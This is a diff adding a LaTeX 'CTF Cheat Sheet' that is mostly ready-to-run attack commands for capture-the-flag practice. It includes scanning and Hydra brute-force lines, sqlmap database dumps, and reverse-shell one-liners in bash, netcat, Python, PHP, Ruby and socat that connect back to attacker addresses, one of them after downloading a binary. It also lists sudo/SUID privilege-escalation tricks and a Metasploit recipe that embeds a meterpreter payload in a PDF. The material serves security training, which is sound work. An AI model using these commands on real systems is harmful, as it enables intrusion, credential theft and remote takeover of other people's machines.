@@ -1,0 +1,333 @@
+\documentclass[12pt,a4paper]{scrartcl}
+\usepackage[utf8]{inputenc}
+\usepackage[ngerman]{babel}
+\usepackage{listings}
+\usepackage{hyperref}
+\lstset{
+	frame=tb,
+	language=Java,
+	aboveskip=3mm,
+	belowskip=3mm,
+	showstringspaces=false,
+	columns=flexible,
+	basicstyle={\small\ttfamily},
+	numbers=none,
+	numberstyle=\tiny\color{gray},
+	%keywordstyle=\color{blue},
+	%commentstyle=\color{dkgreen},
+	%stringstyle=\color{mauve},
+	breaklines=true,
+	breakatwhitespace=true,
+	tabsize=3
+}
+
+%opening
+\title{CTF Cheat Sheet}
+\author{Markus Dietz}
+\date{25. September 2020}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+
+\section{Tools}
+\subsection{nmap}
+\begin{lstlisting}
+	sudo nmap $IP
+	-sV: Version Detection
+	-sC: Default Scripts
+	-oN: Output File
+	-p-: All Ports
+	-A: Aggressive Scan 
+\end{lstlisting}
+
+\subsection{gobuster}
+\begin{lstlisting}
+	gobuster dir -u URL -w Wordlist -x Extension
+\end{lstlisting}
+
+\subsection{nikto}
+\begin{lstlisting}
+	nikto -h IP
+\end{lstlisting}
+
+\subsection{Hydra}
+\begin{lstlisting}
+	hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
+\end{lstlisting}
+For a Website Login:
+\begin{lstlisting}
+	hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^\&password=^PASS^\&Login=Login:Login failed" -V
+\end{lstlisting}
+
+\subsection{SQLMap}
+Manual Injection: \\ \url{https://owasp.org/www-community/attacks/SQL_Injection}\\\\
+To check for a SQL Injection:
+\begin{lstlisting}
+	sqlmap -u http://IP/login.php --forms --risk=3 
+	--level=5 --dbs
+\end{lstlisting}
+To dump all contents of a database:
+\begin{lstlisting}
+	sqlmap -u 'http://10.10.81.50/login.php' -forms
+	-dbs -dump-all -D database
+\end{lstlisting}
+\section{Samba}
+Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system.
+
+Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
+\subsection{SMBmap}
+\begin{lstlisting}
+	smbmap -u admin -p password -h 10.10.10.10 -x "ipconfig"
+\end{lstlisting}
+
+\subsection{Nmap Scripts for Samba}
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.78.82
+\begin{lstlisting}
+	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
+\end{lstlisting}
+
+\subsection{smbclient}
+smbclient allows you to do most of the things you can do with smbmap, and it also offers you and interactive prompt.
+\begin{lstlisting}
+	smbclient //<ip>/anonymous
+\end{lstlisting}
+
+\subsection{smbget}
+\begin{lstlisting}
+	smbget -R smb://<ip>/anonymous
+\end{lstlisting}
+
+\subsection{impacket}
+impacket is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found here:\\ \url{https://github.com/SecureAuthCorp/impacket}\\\\
+Note: impacket has scripts that use other protocols and services besides samba.
+
+\subsection{Enum4linux}
+\begin{lstlisting}
+	enum4linux $IP
+\end{lstlisting}
+
+\subsection{Metasploit}
+
+\section{Reverse Shells}
+\subsection{Bash}
+\begin{lstlisting}
+	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+\end{lstlisting}
+
+\subsection{PERL}
+\begin{lstlisting}
+	--
+\end{lstlisting}
+
+\subsection{netcat}
+\begin{lstlisting}
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+\end{lstlisting}
+
+\subsection{Python}
+As a file:
+\begin{lstlisting}
+	# -*- coding: utf-8 -*-
+	#!/usr/bin/env python
+	import socket, os
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("10.9.7.1", 6969))
+	os.dup2(s.fileno(), 0)
+	os.dup2(s.fileno(), 1)
+	os.dup2(s.fileno(), 2)
+	os.system("/bin/sh -i")
+\end{lstlisting}
+Command line:
+\begin{lstlisting}
+	python -c 'import socket,subprocess,os;s=socket.socket
+	(socket.AF_INET,socket.SOCK_STREAM);
+	s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); 
+	os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=
+	subprocess.call(["/bin/sh","-i"]);'
+\end{lstlisting}
+
+\subsection{PHP}
+As a file:
+\begin{lstlisting}
+	wget https://raw.githubusercontent.com/blanks-hub/CTF/main/php-reverse-shell.php
+\end{lstlisting}
+Command line:
+\begin{lstlisting}
+	php -r '$sock=fsockopen("10.0.0.1",1234);
+	exec("/bin/sh -i <&3 >&3 2>&3");'
+\end{lstlisting}
+
+\subsection{Ruby}
+\begin{lstlisting}
+	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;
+	exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+\end{lstlisting}
+
+\section{Privilege Escalation}
+\begin{lstlisting}
+	
+\end{lstlisting}
+
+\subsection{sudo -l}
+\begin{lstlisting}
+	sudo -u user /var/www/gdb -nx -ex '!sh' -ex quit
+	
+	sudo -u user /usr/bin/git help config
+	!/bin/sh
+\end{lstlisting}
+
+\subsection{SUID}
+Setuids can be exploited. Research for each abnormal setuid program.
+To check what we can run as SUID:
+\begin{lstlisting}
+	find / -perm -u=s -type f 2>/dev/null
+\end{lstlisting}
+
+privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.
+
+General:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings (A bunch of tools and payloads for every stage of pentesting)
+
+
+Linux:
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (a bit old but still worth looking at)
+
+https://github.com/rebootuser/LinEnum( One of the most popular priv esc scripts)
+
+https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh (Another popular script)
+
+https://github.com/mzet-/linux-exploit-suggester (A Script that's dedicated to searching for kernel exploits)
+
+
+https://gtfobins.github.io (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)
+
+
+Windows:
+
+
+https://www.fuzzysecurity.com/tutorials/16.html  (Dictates some very useful commands and methods to enumerate the host and gain intel)
+
+
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp (A bit old but still an incredibly useful script)
+
+
+https://github.com/411Hall/JAWS (A general enumeration script)
+
+\section{Useful stuff}
+
+\subsection{Upgrade your netcat shell}
+Python pty module:
+\begin{lstlisting}
+	python -c 'import pty; pty.spawn("/bin/bash")'
+\end{lstlisting}
+If you the victim doesn't have python installed:
+\begin{lstlisting}
+	/usr/bin/script -qc /bin/bash /dev/null
+\end{lstlisting}
+With socat:
+Listener:
+\begin{lstlisting}
+	socat file:`tty`,raw,echo=0 tcp-listen:4444
+\end{lstlisting}
+Victim:
+\begin{lstlisting}
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+\end{lstlisting}
+If socat isn't installed you can try to get a standalone binary:
+\begin{lstlisting}
+	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.7.1:4444
+\end{lstlisting}
+With magic:
+\begin{lstlisting}
+	python -c 'import pty; pty.spawn("/bin/bash")'
+	CTRL-Z
+	stty raw -echo
+	fg
+	reset
+	export SHELL=bash
+	export TERM=xterm256-color
+	stty rows 38 columns 116
+\end{lstlisting}
+
+\subsection{Setting up a simple webserver}
+Use this to load files on a other machine. The webservers is hosted in the directory the shell is.
+\begin{lstlisting}
+	python3 -m http.server 1337
+\end{lstlisting}
+
+
+\section{Useful Commands}
+\subsection{Netcat}
+To listen a port
+\begin{lstlisting}
+	nc -lnvp 1234
+\end{lstlisting}
+To send data to a port
+\begin{lstlisting}
+	echo hello | nc <ip> 1234
+\end{lstlisting}
+
+\subsection{SSH}
+Use:
+\begin{lstlisting}
+	ssh $user@$IP
+\end{lstlisting}
+If you have found the private key:
+\begin{lstlisting}
+	ssh -i id_rsa $user@$IP
+\end{lstlisting}
+If the key has a password:
+\begin{lstlisting}
+	/usr/share/john/ssh2john.py id_rsa > id_rsa_john.txt
+	
+	john id_rsa_john.txt
+	--wordlist=/usr/share/wordlists/rockyou.txt
+\end{lstlisting}
+
+\subsection{POP3}
+Connect with netcat:
+\begin{lstlisting}
+	nc $IP $port
+\end{lstlisting}
+Most commonly used commands:
+\begin{lstlisting}
+	USER <username>
+	PASS <password>
+	STAT
+	LIST
+	RETR
+	DELE
+	RSET
+	TOP
+	QUIT
+\end{lstlisting}
+
+\section{Miscellaneous}
+
+\subsection{Embedding an exploit in a pdf file}
+This exploit only works on Adobe Reader Version 9.1 or lower.
+\begin{lstlisting}
+	msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
+	
+	msf > exploit (adobe_pdf_embedded_exe) > set payload 
+	windows/meterpreter/reverse_tcp
+	
+	msf > exploit (adobe_pdf_embedded_exe) > set INFILENAME 
+	chapter1.pdf
+	
+	msf > exploit (adobe_pdf_embedded_exe) > set FILENAME 
+	chapter1.pdf
+	
+	msf > exploit (adobe_pdf_embedded_exe) > set LHOST $YOURIP
+	
+	exploit
+\end{lstlisting}
+
+
+
+
+\end{document}
